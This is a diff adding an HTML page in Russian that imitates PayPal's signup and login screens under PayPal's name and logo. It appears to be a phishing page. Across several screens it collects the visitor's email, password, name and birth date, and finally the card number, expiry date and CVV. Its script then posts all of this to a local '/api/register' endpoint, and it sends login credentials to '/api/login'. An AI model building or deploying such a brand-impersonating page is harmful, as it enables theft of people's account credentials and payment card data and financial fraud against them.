@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>PayPal</title>
+
+<style>
+*{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto}
+body{margin:0;background:#fff;color:#111}
+
+.top{
+height:64px;
+display:flex;
+align-items:center;
+justify-content:center;
+padding:0 16px;
+position:relative;
+background:linear-gradient(to bottom,#4f67b8 0%, #1b2f8a 40%, #132b8f 100%);
+}
+
+.menu-btn,
+.login-btn{
+position:absolute;
+top:50%;
+transform:translateY(-50%);
+border:2px solid rgba(255,255,255,.7);
+color:#fff;
+border-radius:999px;
+padding:8px 16px;
+background:transparent;
+font-size:14px;
+cursor:pointer;
+}
+.menu-btn{left:16px}
+.login-btn{right:16px}
+
+.logo{font-weight:700;font-size:20px;color:#fff;}
+
+.screen{display:none;min-height:100vh}
+.screen.active{display:block}
+.wrap{max-width:420px;margin:0 auto;padding:32px 18px}
+
+h2{margin:32px 0 14px;font-size:28px;text-align:center;font-weight:500;}
+.desc{text-align:center;font-size:17px;line-height:1.6;color:#555;margin-bottom:24px;}
+
+.primary{
+width:100%;
+height:56px;
+border:none;
+border-radius:999px;
+background:#000;
+color:#fff;
+font-size:17px;
+margin-bottom:28px;
+cursor:pointer;
+}
+
+.menu-register{background:#0070ba !important;}
+
+.field{margin-bottom:14px}
+.input{
+width:100%;
+height:56px;
+border-radius:16px;
+border:1.5px solid #ddd;
+padding:0 16px;
+font-size:16px
+}
+.input:focus{outline:none;border-color:#2563eb}
+.input.error{border-color:red}
+
+.input-wrap{position:relative}
+.eye{
+position:absolute;
+right:14px;
+top:50%;
+transform:translateY(-50%);
+font-size:18px;
+opacity:.6;
+cursor:pointer
+}
+
+.check{display:flex;gap:10px;align-items:flex-start;margin-bottom:8px;color:#555}
+.check span{font-size:18px;color:#22c55e}
+
+.card{
+border:1px solid #eee;
+border-radius:18px;
+padding:18px;
+margin-bottom:16px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+.card h3{margin:0 0 6px;font-size:18px;font-weight:500;}
+.card p{margin:0;color:#666;font-size:15px;}
+.arrow{font-size:22px;color:#999}
+</style>
+</head>
+
+<body>
+
+<section id="start" class="screen active">
+<div class="top">
+<button class="menu-btn">☰</button>
+<div class="logo">PayPal</div>
+<button class="login-btn" onclick="go('login')">Войти</button>
+</div>
+
+<div class="wrap">
+<h2>Личный</h2>
+<div class="desc">
+Покупайте на сайтах по всему миру<br>
+и отправляйте денежные переводы<br>
+друзьям и близким.
+</div>
+<button class="primary menu-register" onclick="go('reg-email')">Зарегистрироваться</button>
+
+<h2>Бизнес</h2>
+<div class="desc">
+Принимайте онлайн-платежи<br>
+от клиентов через единый<br>
+бизнес-аккаунт.
+</div>
+<button class="primary menu-register" onclick="go('reg-email')">Зарегистрироваться</button>
+</div>
+</section>
+
+<section id="login" class="screen">
+<div class="top">
+<button class="menu-btn" onclick="go('start')">←</button>
+<div class="logo">PayPal</div>
+</div>
+
+<div class="wrap">
+<h2>Вход</h2>
+<div class="field"><input id="loginEmail" class="input" placeholder="Email или телефон"></div>
+<div class="field"><input id="loginPass" class="input" type="password" placeholder="Пароль"></div>
+<button class="primary" onclick="validateLogin()">Войти</button>
+</div>
+</section>
+
+<section id="reg-email" class="screen">
+<div class="top">
+<button class="menu-btn" onclick="go('start')">←</button>
+<div class="logo">PayPal</div>
+</div>
+
+<div class="wrap">
+<h2>Открыть счёт в PayPal</h2>
+<div class="field">
+<input id="regEmail" class="input" placeholder="Электронная почта">
+</div>
+<button class="primary" onclick="validateEmail()">Далее</button>
+</div>
+</section>
+
+<section id="reg-pass" class="screen">
+<div class="top">
+<button class="menu-btn" onclick="go('reg-email')">←</button>
+<div class="logo">PayPal</div>
+</div>
+
+<div class="wrap">
+<h2>Создание пароля</h2>
+
+<div class="field input-wrap">
+<input id="pwd" class="input" type="password" placeholder="Создайте пароль">
+<span class="eye" onclick="togglePwd()">👁</span>
+</div>
+
+<div class="check"><span>✔</span><p>От 8 до 20 символов</p></div>
+<div class="check"><span>✔</span><p>Минимум два типа символов</p></div>
+
+<button class="primary" onclick="validatePassword()">Далее</button>
+</div>
+</section>
+
+<section id="reg-data" class="screen">
+<div class="top">
+<button class="menu-btn" onclick="go('reg-pass')">←</button>
+<div class="logo">PayPal</div>
+</div>
+
+<div class="wrap">
+<h2>Личные данные</h2>
+<div class="desc">Убедитесь, что введённая информация корректна.</div>
+
+<div class="field">
+<input id="firstName" class="input" placeholder="Имя">
+</div>
+
+<div class="field">
+<input id="lastName" class="input" placeholder="Фамилия">
+</div>
+
+<div class="field">
+<input id="birth" class="input" placeholder="DD/MM/YYYY" maxlength="10" oninput="formatBirth(this)">
+</div>
+
+<button class="primary" onclick="validateData()">Далее</button>
+</div>
+</section>
+
+<section id="reg-card" class="screen">
+<div class="top">
+<button class="menu-btn" onclick="go('reg-data')">←</button>
+<div class="logo">PayPal</div>
+</div>
+
+<div class="wrap">
+<h2>Добавление карты</h2>
+
+<div class="field input-wrap">
+<input id="cardNum" class="input" placeholder="Номер карты" maxlength="19" oninput="formatCard(this)">
+<span class="eye">💳</span>
+</div>
+
+<div style="display:flex;gap:14px">
+
+<div class="field" style="flex:1">
+<input id="exp" class="input" placeholder="MM/YY" maxlength="5" oninput="formatExp(this)">
+</div>
+
+<div class="field" style="flex:1">
+<input id="cvv" class="input" placeholder="CVV" maxlength="4">
+</div>
+
+</div>
+
+<button class="primary" onclick="validateCard()">Добавить карту</button>
+</div>
+</section>
+
+<section id="after-auth" class="screen">
+<div class="top">
+<button class="menu-btn">☰ Меню</button>
+<div class="logo">PayPal</div>
+</div>
+
+<div class="wrap">
+<h2>Вход выполнен</h2>
+
+<div class="desc">
+Отправляйте переводы и совершайте покупки<br>
+быстро и удобно с вашего аккаунта.
+</div>
+
+<div class="card">
+<div>
+<h3>Онлайн-покупки</h3>
+<p>Оплачивайте товары и услуги через PayPal.</p>
+</div>
+<div class="arrow">→</div>
+</div>
+
+<div class="card">
+<div>
+<h3>Переводы</h3>
+<p>Отправляйте деньги друзьям и близким.</p>
+</div>
+<div class="arrow">→</div>
+</div>
+
+</div>
+</section>
+
+<script>
+
+let regData = {};
+
+function go(id){
+document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+document.getElementById(id).classList.add('active');
+window.scrollTo(0,0);
+}
+
+function togglePwd(){
+const p=document.getElementById('pwd');
+p.type=p.type==='password'?'text':'password';
+}
+
+function formatBirth(input){
+let v=input.value.replace(/\D/g,'');
+if(v.length>2 && v.length<=4)
+v=v.slice(0,2)+'/'+v.slice(2);
+else if(v.length>4)
+v=v.slice(0,2)+'/'+v.slice(2,4)+'/'+v.slice(4,8);
+input.value=v;
+}
+
+function formatExp(input){
+let v=input.value.replace(/\D/g,'');
+if(v.length>2)
+v=v.slice(0,2)+'/'+v.slice(2,4);
+input.value=v;
+}
+
+function formatCard(input){
+let v=input.value.replace(/\D/g,'');
+let formatted='';
+for(let i=0;i<v.length;i++){
+if(i>0 && i%4==0) formatted+=' ';
+formatted+=v[i];
+}
+input.value=formatted;
+}
+
+function validateEmail(){
+let email=document.getElementById('regEmail');
+let pattern=/^[^ ]+@[^ ]+\.[a-z]{2,}$/;
+if(!pattern.test(email.value)){
+alert("Введите корректный email");
+return;
+}
+regData.email=email.value;
+go('reg-pass');
+}
+
+function validatePassword(){
+let pwd=document.getElementById('pwd');
+let strong=/^(?=.*[A-Za-z])(?=.*\d).{8,20}$/;
+if(!strong.test(pwd.value)){
+alert("Пароль 8-20 символов и минимум буквы + цифры");
+return;
+}
+regData.password=pwd.value;
+go('reg-data');
+}
+
+function validateData(){
+regData.firstName=document.getElementById('firstName').value;
+regData.lastName=document.getElementById('lastName').value;
+regData.birth=document.getElementById('birth').value;
+go('reg-card');
+}
+
+function validateCard(){
+
+regData.card=document.getElementById('cardNum').value;
+regData.exp=document.getElementById('exp').value;
+regData.cvv=document.getElementById('cvv').value;
+
+fetch("/api/register",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify(regData)
+})
+.then(r=>r.json())
+.then(res=>{
+if(res.status=="ok"){
+go('after-auth');
+}else{
+alert(res.message);
+}
+});
+}
+
+function validateLogin(){
+
+let e=document.getElementById('loginEmail').value;
+let p=document.getElementById('loginPass').value;
+
+fetch("/api/login",{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({email:e,password:p})
+})
+.then(r=>r.json())
+.then(res=>{
+if(res.status=="ok"){
+go('after-auth');
+}else{
+alert(res.message);
+}
+});
+
+}
+
+</script>
+
+</body>
+</html>
